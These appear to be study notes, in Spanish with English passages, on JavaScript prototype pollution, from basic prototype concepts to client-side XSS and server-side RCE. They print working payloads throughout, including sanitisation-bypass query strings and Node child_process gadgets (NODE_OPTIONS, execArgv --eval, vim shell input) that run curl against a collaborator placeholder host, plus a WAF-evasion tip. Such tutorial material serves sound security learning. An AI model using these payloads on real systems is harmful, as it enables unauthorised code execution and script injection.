Prototype pollution

## Intro


Prototype pollution es una vulnerabilidad de JavaScript que hace posible que un atacante añada propiedades arbitrarias a global object prototypes 

### ¿Qué es un objeto?

Un objeto en JavaScript no es más que una colección de pares clave valor conocidas como `properties` , ejemplo:

```js
const user = { 
	username: "wiener", 
	userId: 01234, 
	isAdmin: false 
}
```

Para acceder a las propiedades de un objeto en js hay dos formas : 

```js
user.username // "wiener" 
user['userId'] // 01234
```

Además de propiedades los objetos tienen métodos que no son más que funciones que ejecutan acciones:

```js
const user = { 
	username: "wiener", 
	userId: 01234, 
	exampleMethod: function(){
	 // do something 
	} 
}
```

En JavaScript casi todo es un objeto

### ¿Qué es un prototype?

Cada objeto en JavaScript está vinculado a otro objeto de algún tipo, conocido como su prototype.
JavaScript asigna de forma automática a un nuevo objeto alguno de sus bult-in prototypes, por ejemplo, a un string javascript le asignará String.prototype, otros ejemplos son `Object.prototype` , `Array.prototype` , `Number.prototype`

Estos built-in prototypes tienen sus propios métodos y propiedades, por ejemplo los objetos Strings.prototype tienen el método toLowerCase()

### Herencia en JavaScript

En javascript cuando referencias una propiedad de un objeto, el motor de javascript intentará acceder directamente a la propiedad del objeto, si esta propiedad no está en el objeto entonces lo buscara en su prototype, esto te dejará hacer `myObject.propertyA` 
![[Pasted image 20251208001157.png]]


### Acceder al prototype de un objeto usando ` __proto__`

Todo objeto tiene una propiedad especial con la que puedes acceder a su prototype , esta propiedad en la mayoría de buscadores suele estar majo el nombre de `__proto__`, esta propiedad hace de getter y setter para el prototype del objeto, se accede a el de dos formas :

```js
username.__proto__ 
username['__proto__']
```

Tambien puedes concatenar `__proto__` para acceder al prototype de onjetos de los que deriva:

```js
username.__proto__ // String.prototype 
username.__proto__.__proto__ // Object.prototype 
username.__proto__.__proto__.__proto__ // null
```

### Cambiar los prototypes 

Aunque sea considerado como mala práctica, es posbile cambiar el prototype de un objeto, esto significa que los desarrolladores pueden customizar o sobreescribir el comportamiento de los métodos built-in.

Por ejemplo versiones modernas de javascript tiene el métodod trim() para los strings, que les quita los espacios, pero este tipo de métodos se pueden crear de forma manual : 

```js
String.prototype.removeWhitespace = function(){ 
	// remove leading and trailing whitespace 
}
```

```js
let searchTerm = " example "; 
searchTerm.removeWhitespace(); // "example"
```

## De donde salen estas vulnerabilidades

Estas vulnerabilidades aparecen cuando un objeto con propiedades que puede controlar el usuario se fusiona con otro objeto ya existente sin sanitizar, esto puede permitir a un atacante inyectar una propiedad con una clave como `__proto__` haciendo que cuando se fusienen los objetos las propiedades puestas por el `__proto__` sean asignadas al prototype y no al objeto normal, ejemplo de clave maliciosa:

```js
{
  "__proto__": {
    "isAdmin": true
  }
}
```

A esto se le llama contaminar el prototipo, o prototype pollution

## Prototype pollution sources

Los prototype pollution sources son cualquier input que puede controlar el usuario que deje que un atacante pueda añadir propiedades de forma arbitraria al prototipo de los objetos, normalmente suelen ser :

-The URL via either the query or fragment string (hash)
-JSON-based input 
-Web messages

### Por medio de la URL

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Lo que va detrás del ? es una query string, muchos framworks y parsers de URL convierten esta query en un objeto  JavaScript: 

```js
{ 
	existingProperty1: 'foo', 
	existingProperty2: 'bar', 
	__proto__: { 
		evilProperty: 'payload' 
	} 
}
```

El problema viene cuando el desarrollador hace merge de el objeto de la URL con un objeto real de esta forma:
```js
merge(targetObject, queryParams)
```

Pensando que el resultado será algo como lo de arriba pero acaba siendo esto:

```js
targetObject.__proto__.evilProperty = 'payload';
```

Y como JavaScript interpreta `__proto__` como una propiedad especial conseguimos que `evilProperty` se escriba en `Object.prototype`, de esta forma todos los objetos como heredan de Object tendrán esta propiedad maliciosa

### Por medio de un JSON

Objetos controlados por el usuario a veces derivan de un JSON string usando el método `JSON.parse()` , este método trata cualquier clave en el objeto JSON como un stringincluido cosas como `__proto__`

Imaginemos que el atacante envía este JSON por ejemplo a través de un web message:

```JSON
{ 
	"__proto__": { 
		"evilProperty": "payload" 
	} 
}
```

Si esto es convertido a JavaScript por medio de JSON.parse() el objeto tendrá una propiedad con la clave `__proto__` :

```js
const objectLiteral = {__proto__: {evilProperty: 'payload'}}; 
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); 

objectLiteral.hasOwnProperty('__proto__'); // false 
objectFromJson.hasOwnProperty('__proto__'); // true
```

Si esto lo juntamos a que el objeto creado usa merge con otro objeto entonces tendríamos un prototype pollution 

## Client-side prototype pollution

### XSS con query string

Muchos objetos tienen propiedades que si no se definen se ponen con algún valor por defecto como por ejemplo : 

```js
let transport_url = config.transport_url || defaults.transport_url;
```

Ahora imaginemos que ese `transport_url` se usa para referenciar un script en la web:

```js
let script = document.createElement('script'); 
script.src = `${transport_url}/example.js`; 
document.body.appendChild(script);
```

si el desarrollador no ha puesto una propiedad `transport_url` en el objeto `config` esto es potencialmente un gadget (prototype poluution que tiene exploit), esto será posible si un atacante puede contarminar `Object.prototype` y poner su propio `transport_url` 

Ejemplo de exploit :

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

También se puede hacer XSS directo si especificamos el campo data en la url:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix.
### Como encontrarlo de forma manual
#### 1.Inyectar una propiedad

1. Intentar inyectar una propiedad arbitraria mediante un query string, fragment URL o JSON input 

```
vulnerable-website.com/?__proto__[foo]=bar
```

2. En la consola del navegador inspecciona `Object.prototype` para ver si la propiedad fue inyectada de forma correcta 

```
Object.prototype.foo 
// "bar" indicates that you have successfully polluted the prototype 
// undefined indicates that the attack was not successful
```

3. Si no ha funcionado trata de cambiar de notación a la de punto:

```
vulnerable-website.com/?__proto__.foo=bar
```

4. Si nada de esto funciona se puede hacer prototype polution con el constructor (se ve mas adelante)

#### 2.Encontrar un gadget para craftear el exploit

1. Mirar en el codigo propiedades que se usen y librerías que se importan 
2. En burp habilita la opción de interceptar respuestas (**Proxy > Options > Intercept server responses**) e intercepta la respuesta del JavaScript que quieres testear
3. Añade un debugger statement al inicio del script 
4. En el buscador abre la parte de la web que ejecuta el script el debugger habrá parado la ejecución 
5. Mientras el script está en pausa, en la consola pega esto cambiando YOUR-PROPERTY por la propiedad que piensas que puede ser un gadget 
```js
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
	get() { 
		console.trace(); 
		return 'polluted'; 
	} 
})
```

De esta forma la propiedad será añadida a `Object.prototype` y el buscador registrará un stack trace cada que se accede a esa propiedad 

6. Sigue con la ejecución del script y estate atento a la consola del buscador, si aparece algún stack trace es porque la web hizo uso de esa propeidad 
7. Mira la línea de codigo en la que esa propiedad fue usada
8. Comprobar si la propiedad fue pasada a alguna función como `eval()` o `innerHTML()`
9. Repetir este proceso hasta encontrar un gadget 
### Prototype pollution via the constructor

Todo objeto tiene un constructor, y el constructor no es mas que una función que a su vez es un objeto, por ende el constructor tiene su prototype que apunta al prototype de los objetos creados con ese constructor por ende se puede acceder al prototype del objeto de esta forma :

```js
myObject.constructor.prototype // Object.prototype 
```

o en JSON

```JSON
"constructor": { 
	"prototype": { 
		"isAdmin":true 
	} 
}
```
### Bypassing flawed key sanitization

Si quita el string `__proto__`  de forma no recursiva: 

```
/?__pro__proto__to__[foo]=bar 
/?__pro__proto__to__.foo=bar 
/?constconstructorructor[protoprototypetype][foo]=bar 
/?constconstructorructor.protoprototypetype.foo=bar`
```

### Prototype pollution in third-party libraries

Para esto es mejor usar el DOM invader

### Prototype pollution via browser APIs

Hay un monton de prototype pollutions gadgets en las APIs  de JavaScript usadas por los buscadores 

### Prototype pollution via fetch()

Ejemplo de código vulnerable :

```js
fetch('/my-products.json',{method:"GET"}) 
	.then((response) => response.json()) 
	.then((data) => { 
		let username = data['x-username']; 
		let message = document.querySelector('.message'); 
		if(username) { 
			message.innerHTML = `My products. Logged in as <b>${username}</b>`; 
			} 
			let productList = document.querySelector('ul.products'); 
			for(let product of data) { 
				let product = document.createElement('li'); 
				product.append(product.name); 
				productList.append(product); 
			} 
	}) 
	.catch(console.error);

```

Exploit:

```js
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

### Prototype pollution via Object.defineProperty()

Desarrolladores que sepan sobre prototype pollution pueden intentar evitarlo con `Object.defineProperty()`  esta función deja crear una propiedad que no es configurable ni reescribible directamente en el objeto :

```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', { 
	configurable: false, 
	writable: false 
})
```

`Object.defineProperty()` acepta un objeto de opciones conocido como "descriptor" , los desarrolladores pueden usar este objeto descriptor para poner un valor inicial a la propiedad, por ende el objetivo del atacante es contaminar al descriptor que pasará la propiedad contaminada a la función `Object.defineProperty()` 

## Server-side prototype pollution


En un principio JavaScript fue un lenguaje hecho para el front-end pero ahora se usa también para crear API's y servers como lo usa Node.js entre otros, la teoría es básicamente la misma, lo que se complica es la detección de la vulnerabilidad

En esta sección se verá como buscar desde una perspectiva black-box esta vilnerabilidad de forma segura
### Detecting server-side prototype pollution via polluted property reflection

Un error en el que pueden caer los developers es olvidarse que los bucles `for ... in` itera sobre todas las propiedades numerables de un objeto incluidas las que se heredan del prototipo.

Si estas propiedades se ven reflejadas en la web podremos probar por server side proptype pollution

Peticiones `POST` y `PUT`, que mandan un JSON a una app o API en el body son peticiones interesantes para analizar en busca de esta vulnerabilidad, porque en estos casos la response suele representar en JSON el nuevo o actualizado objeto, por ejemplo podríamos enviar este JSON :

```
POST /user/update HTTP/1.1 
Host: vulnerable-website.com 
... 
{ 
	"user":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"__proto__":{ 
		"foo":"bar" 
	} 
}
```

Si la web es vulnerable en la respuesta veremos reflejada la nueva propiedad:

```
HTTP/1.1 200 OK 
... 
{ 
	"username":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"foo":"bar" 
}
```

En casos mas raros esta propiedad podría renderizarse en el html haciendo que podamos hacer XSS

Una vez identificada la vulnerabilidad habrá que buscar un gadget, cualquier opción en la que se cambie la información de un usuario vale la pena investigar, porque normalmente por detrás lo que hace el servidor es fusionar el objeto antiguo con el actualizado

### Detecting server-side prototype pollution without polluted property reflection

En este caso aunque hayamos contaminado la propiedad de forma efectiva esta no se verá reflejada en ningún sitio y no podremos saber las propiedades que usa el objeto, por eso desde una perspectiva black box no nos queda mas que adivinar el nombre de propiedades que puedan provocar un cambio de comportamiento en la web

### Status code override

Server-side JavaScript frameworks como Express dejan a los desarrolladores poner estados de respuestas HTTP custom, ejemplo:

```http
HTTP/1.1 200 OK 
... 
{ 
	"error": { 
		"success": false, 
		"status": 401, 
		"message": "You do not have permission to access this resource." 
	} 
}
```

El módulo de node que genera este tipo de errores HTTP es así:

```js
function createError () { 
//... 
if (type === 'object' && arg instanceof Error) { 
	err = arg 
	status = err.status || err.statusCode || status 
} else if (type === 'number' && i === 0) { 
//... 
if (typeof status !== 'number' || 
(!statuses.message[status] && (status < 400 || status >= 600))) { 
	status = 500 
} 
//...
```

En este código lo importante es esta línea : 

```js
status = err.status || err.statusCode || status 
```

Si el developer no ha puesto una propiedad específica para el status podemos usarla como gadget

### JSON spaces override

El framework de Express te da la opción `json spaces`, lo que te permite configurar la cantidad de espacios utilizados para indentar cualquier dato JSON en la respuesta, en muchos casos los developers dejan esta propeidad con el valor por defecto haciéndolo susceptible a prototype pollution.

Si tenemos algún tipo de respuesta JSON podríamos probar a contaminar la propiedad `json spaces` luego reenviar la petición y ver si el número de espacios ha cambiado.

```
Nota: para este tipo de ataques en la respuseta de burp cambiar al modo raw, si no no veremos la diferencia de espacios
```
### Charset override

Frameworks como Express peuden implementar un "middleware" que pre-procesará las peticiones antes de enviarlas a su respectivo handler. Por ejemplo, el módulo `body-parser` es comúnmente usado para parsear el body de las request entrantes y generar un objeto `req.body` (otro posible gadget)

Si te das cuenta este código pasa una opciones a la función `read()` que es encarga de leer el body de una petición para parsearla, una de estas opciones es `encoding` , que determina que tipo de encoding tiene que usar y si no está definida usará UTF-8 por defecto:

```js
var charset = getCharset(req) or 'utf-8' 

function getCharset (req) { 
	try { 
		return (contentType.parse(req).parameters.charset || '').toLowerCase() 
	} catch (e) { 
		return undefined 
	} 
} 

read(req, res, next, parse, debug, { 
	encoding: charset, 
	inflate: inflate, 
	limit: limit, 
	verify: verify 
})
```

If you look closely at the `getCharset()` function, it looks like the developers have anticipated that the `Content-Type` header may not contain an explicit `charset` attribute, so they've implemented some logic that reverts to an empty string in this case. Crucially, this means it may be controllable via prototype pollution.

**Explotación**

1. Añadir unr string UTF-7 encoded a una propiedad que se vea reflejada como en este caso "role"-> `+AGYAbwBv-` es `foo` en UTF-7
```JSON
{ 
	"sessionId":"0123456789", 
	"username":"wiener", 
	"role":"+AGYAbwBv-" 
}
```

2. Envía la petición, los servidores no decodifican UTF-7 por defento por ende el string en la respuesta saldrá encodeado
3. Intenta contaminar el prototipo para que acepte UTF-7
```JSON
{ 
	"sessionId":"0123456789", 
	"username":"wiener", 
	"role":"default", 
	"__proto__":{ 
		"content-type": "application/json; charset=utf-7" 
	} 
}
```
4. Si conseguiste contaminar el prototipo de forma correcta entonces al enviar lo de arriba la respuesta será esta:
```JSON
{ 
	"sessionId":"0123456789", 
	"username":"wiener", 
	"role":"foo" 
}
```

---------------

Por un bug en la función `_http_incoming` de Node.js, este ataque se puede hacer aunque el atributo estuviese definido desde un primer momento. Para evitar que se sobreescriban valores de las propiedades, la función `_addHeaderLine()` mira que no exista ninguna propiedad con la misma clave antes de transferir las propiedades a el objeto `IncomingMessage` :

```js
IncomingMessage.prototype._addHeaderLine = _addHeaderLine; 

function _addHeaderLine(field, value, dest) { 
	// ... 
	} else if (dest[field] === undefined) { 
	// Drop duplicates 
	dest[field] = value; 
	} 
}
```

Due to the way this is implemented, this check (presumably unintentionally) includes properties inherited via the prototype chain. This means that if we pollute the prototype with our own `content-type` property, the property representing the real `Content-Type` header from the request is dropped at this point, along with the intended value derived from the header.





### RCE via server-side prototype pollution

Hay muchas formas de conseguir RCE en Node, muchas de ellas salen del módulo `child_process`. Estas suelen ser invocadas por una request asíncronamente a la request que podemos contaminar, por ello la mejor forma de probar el RCE en estas request es contaminando el prototipo de una de manera que pueda hacerle una petición a nuestro burp collaborator o webhook cuando sea llamada.

The `NODE_OPTIONS` environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the `env` object, you can potentially control this via prototype pollution if it is undefined.

Algunas funciones de Node para crear procesos hijos usan la propiedad opcional `shell` que permite a los desarrolladores implementar una shell como bash para ejecutar comandos, si esto lo juntamos a una propiedad `NODE_OPTIONS` contaminada podremos lanzar una petición a nuestro servidor:

```JSON
"__proto__": { 
	"shell":"node", 
	"NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com" 
}
```

The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.

### RCE via child_process.fork()

Métodos como `child_process.spawn()` o `child_process.fork()` permiten a los developers crear nuevos subprocesos en Node.
El método `fork()` acepta un objeto opción que potencialmente tendrá la propiedad `execArgv`, esto es un array de strings que contiente líneas de comandos que se tiene que ejecutar cuando se crea un proceso hijo, si se deja indefinido puede ser vulnerable a prototype pollution 

As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using `NODE_OPTIONS`. Of particular interest is the `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment:

```JSON
"execArgv": [ 
	"--eval=require('<module>')" 
]
```

In addition to `fork()`, the `child_process` module contains the `execSync()` method, which executes an arbitrary string as a system command. By chaining these JavaScript and command injection sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server.

```JSON
"__proto__": { 
	"execArgv":[ 
		"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" 
	] 
}
```


### RCE via child_process.execSync()

In the previous example, we injected the `child_process.execSync()` sink ourselves via the `--eval` command line argument. In some cases, the application may invoke this method of its own accord in order to execute system commands.

Just like `fork()`, the `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an `execArgv` property, you can still inject system commands into a running child process by simultaneously polluting both the `shell` and `input` properties:

- The `input` option is just a string that is passed to the child process's `stdin` stream and executed as a system command by `execSync()`. As there are other options for providing the command, such as simply passing it as an argument to the function, the `input` property itself may be left undefined.
- The `shell` option lets developers declare a specific shell in which they want the command to run. By default, `execSync()` uses the system's default shell to run commands, so this may also be left undefined.

By polluting both of these properties, you may be able to override the command that the application's developers intended to execute and instead run a malicious command in a shell of your choosing. Note that there are a few caveats to this:

- The `shell` option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.
- The shell is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.
- As the `input` property containing your payload is passed via `stdin`, the shell you choose must accept commands from `stdin`.Although they aren't really intended to be shells, the text editors Vim and ex reliably fulfill all of these criteria. If either of these happen to be installed on the server, this creates a potential vector for RCE:

`"shell":"vim", "input":":! <command>\n"`

**Exploit**

```JSON
"__proto__": { 
	"shell":"vim", 
	"input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n" 
}
```
#### Note

Vim has an interactive prompt and expects the user to hit `Enter` to run the provided command. As a result, you need to simulate this by including a newline (`\n`) character at the end of your payload, as shown in the example above.

One additional limitation of this technique is that some tools that you might want to use for your exploit also don't read data from `stdin` by default. However, there are a few simple ways around this. In the case of `curl`, for example, you can read `stdin` and send the contents as the body of a `POST` request using the `-d @-` argument.

In other cases, you can use `xargs`, which converts `stdin` to a list of arguments that can be passed to a command.
